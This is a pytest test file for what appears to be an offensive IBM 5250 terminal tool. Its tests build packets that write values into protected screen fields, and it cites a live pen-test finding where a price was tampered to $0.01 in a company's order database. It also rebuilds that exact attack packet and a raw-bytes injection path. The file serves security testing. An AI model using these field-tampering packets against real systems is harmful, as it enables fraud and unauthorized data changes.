"""
Multi-field inject — the full protected-field tampering attack.

Live finding (Mels Cargo, 2026-04-08): single send_field to a
protected price position persisted $0.01129.59 to the order database.
The host's RECEIVE doesn't validate SBA addresses against the format
table.

send_fields lets you do the COMBINED attack: legit input field +
extra SBA pairs at protected positions, all in one packet. The host
can't distinguish which pairs are "supposed" to be there.
"""
import json
import pytest
from hack5250.libhack5250 import Hack5250
from hack5250.constants import AID_TABLE, HDR_LEN, ORD_SBA


@pytest.fixture
def h(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    h = Hack5250("127.0.0.1", 23, project_name="test")
    # Stub the server socket so inject_to_server doesn't raise
    class FakeSock:
        def __init__(self): self.sent = []
        def send(self, data): self.sent.append(data)
    h.daemon.server = FakeSock()
    yield h
    h.daemon.server = None  # avoid close() on the fake
    h.shutdown()


def call(h, cmd, args=""):
    return h.api._handlers[cmd](args)


# === send_fields method ===

def test_send_fields_builds_multi_sba_packet(h):
    """Two fields → two SBA blocks in the body."""
    pkt = h.send_fields([(20, 17, "Y"), (5, 20, "99999")])
    body = pkt[HDR_LEN:-2]  # strip header + IAC EOR
    # body: cursor_row cursor_col aid SBA r c data SBA r c data
    assert body[0] == 20   # cursor row (defaults to first field)
    assert body[1] == 17   # cursor col
    assert body[2] == AID_TABLE["ENTER"]
    # First SBA block
    assert body[3] == ORD_SBA
    assert body[4] == 20
    assert body[5] == 17
    assert body[6:7] == b"\xE8"  # 'Y' in EBCDIC
    # Second SBA block — the protected-field tamper
    assert body[7] == ORD_SBA
    assert body[8] == 5
    assert body[9] == 20
    assert body[10:15] == b"\xF9\xF9\xF9\xF9\xF9"  # '99999' in EBCDIC


def test_send_fields_returns_packet_for_inspection(h):
    """Caller gets the bytes back — useful for replay/debugging."""
    pkt = h.send_fields([(1, 1, "X")])
    assert isinstance(pkt, bytes)
    assert pkt.endswith(b"\xff\xef")  # IAC EOR


def test_send_fields_actually_injects(h):
    """The packet goes to the server, not just returned."""
    h.send_fields([(1, 1, "test")])
    assert len(h.daemon.server.sent) == 1


def test_send_fields_cursor_defaults_to_first_field(h):
    pkt = h.send_fields([(7, 30, "A"), (1, 1, "B")])
    assert pkt[HDR_LEN] == 7
    assert pkt[HDR_LEN + 1] == 30


def test_send_fields_explicit_cursor(h):
    pkt = h.send_fields([(7, 30, "A")], cursor=(24, 80))
    assert pkt[HDR_LEN] == 24
    assert pkt[HDR_LEN + 1] == 80


def test_send_fields_aid_override(h):
    pkt = h.send_fields([(1, 1, "X")], aid_name="F3")
    assert pkt[HDR_LEN + 2] == AID_TABLE["F3"]


def test_send_fields_empty_raises(h):
    with pytest.raises(ValueError):
        h.send_fields([])


# === send_raw method ===

def test_send_raw_passes_through_unchanged(h):
    """No header building, no validation — bytes go straight."""
    payload = b"\xde\xad\xbe\xef"
    h.send_raw(payload)
    assert h.daemon.server.sent[-1] == payload


# === API handlers ===

def test_send_fields_api_handler(h):
    # Avoid col=17 (0x11 == ORD_SBA byte value — false positives in count)
    req = {"fields": [[20, 19, "Y"], [5, 20, "99999"]], "aid": "ENTER"}
    resp = json.loads(call(h, "send_fields", json.dumps(req)))
    assert resp["sent"] is True
    assert resp["field_count"] == 2
    # Packet has exactly 2 SBA orders in the body
    pkt = bytes.fromhex(resp["packet_hex"])
    body = pkt[HDR_LEN:-2]
    # Walk SBA blocks: cursor(2) + aid(1) + [SBA r c data]*
    pos = 3
    sba_count = 0
    while pos < len(body):
        if body[pos] == ORD_SBA:
            sba_count += 1
            pos += 3  # SBA + row + col
            while pos < len(body) and body[pos] != ORD_SBA:
                pos += 1  # data bytes
        else:
            break
    assert sba_count == 2


def test_send_fields_api_bad_json(h):
    resp = call(h, "send_fields", "not json")
    assert resp.startswith("ERROR")


def test_send_fields_api_missing_fields(h):
    resp = call(h, "send_fields", '{"aid":"ENTER"}')
    assert resp.startswith("ERROR")
    assert "fields" in resp


def test_send_fields_api_bad_aid(h):
    req = {"fields": [[1, 1, "X"]], "aid": "NOTAKEY"}
    resp = call(h, "send_fields", json.dumps(req))
    assert resp.startswith("ERROR")


def test_send_fields_api_with_cursor(h):
    req = {"fields": [[1, 1, "X"]], "cursor": [10, 5]}
    resp = json.loads(call(h, "send_fields", json.dumps(req)))
    pkt = bytes.fromhex(resp["packet_hex"])
    assert pkt[HDR_LEN] == 10
    assert pkt[HDR_LEN + 1] == 5


def test_send_raw_hex_api(h):
    resp = json.loads(call(h, "send_raw_hex", "deadbeef"))
    assert resp["sent"] is True
    assert resp["bytes"] == 4
    assert h.daemon.server.sent[-1] == b"\xde\xad\xbe\xef"


def test_send_raw_hex_api_with_spaces(h):
    """Spaces in hex are stripped for readability."""
    resp = json.loads(call(h, "send_raw_hex", "de ad be ef"))
    assert resp["bytes"] == 4


def test_send_raw_hex_api_bad_hex(h):
    resp = call(h, "send_raw_hex", "notahex")
    assert resp.startswith("ERROR")


def test_send_raw_hex_api_empty(h):
    resp = call(h, "send_raw_hex", "")
    assert resp.startswith("ERROR")


# === The actual attack pattern ===

def test_mels_cargo_attack_packet_shape(h):
    """The exact packet from the live pen test (Attack 4):
    Order=Y at the legit input + Item#=99999 at the protected r5c20.

    This is what couldn't be sent during the test because send_fields
    didn't exist yet. Now it builds correctly.
    """
    pkt = h.send_fields(
        [(20, 19, "Y"),       # Order Supply input field — legit
         (5, 20, "99999")],   # Item # — protected, tampering
        aid_name="ENTER",
    )
    # Header: correct alignment (the e4a29ad fix)
    assert pkt[6] == 0x04  # var_hdr_len at byte 6
    assert pkt[9] == 0x03  # opcode PUT_GET at byte 9
    # Body has both fields
    body = pkt[HDR_LEN:-2]
    sba_positions = [i for i, b in enumerate(body) if b == ORD_SBA]
    assert len(sba_positions) == 2
    # Second SBA points at the protected position
    assert body[sba_positions[1] + 1] == 5   # row
    assert body[sba_positions[1] + 2] == 20  # col
